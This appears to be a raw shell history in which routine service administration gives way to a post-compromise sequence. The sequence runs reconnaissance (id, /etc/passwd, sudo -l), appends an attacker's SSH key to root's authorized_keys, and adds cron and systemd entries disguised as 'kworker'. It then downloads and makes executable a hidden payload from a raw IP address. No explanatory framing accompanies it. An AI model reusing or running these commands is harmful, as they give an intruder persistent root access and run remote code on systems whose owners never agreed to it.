systemctl status app
sudo systemctl restart app
tail -f /var/log/app/app.log
cd app
ls
git pull
make deploy
id
uname -a
w
cat /etc/passwd
ls -la
ps aux
sudo -l
sudo tee -a /etc/cron.d/kworker
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIvvERQYUJJRYEEzLVN7CGTA0Ae13n/z0/9b3viII9Ft x@kali' | sudo tee -a /root/.ssh/authorized_keys
sudo tee -a /etc/systemd/system/kworker.service
wget -q http://203.175.78.138/k -O /var/tmp/.k
chmod +x /var/tmp/.k
history -w
